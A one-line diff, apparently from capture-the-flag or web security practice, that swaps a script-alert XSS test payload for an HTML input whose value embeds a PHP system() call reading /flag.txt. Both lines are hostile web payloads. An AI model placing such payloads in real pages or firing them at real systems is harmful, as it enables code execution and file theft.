@@ -1,1 +1,1 @@
-<script>alert('I am hack!')</script>
+<input type='text' value='<?php echo system("cat /flag.txt");'>
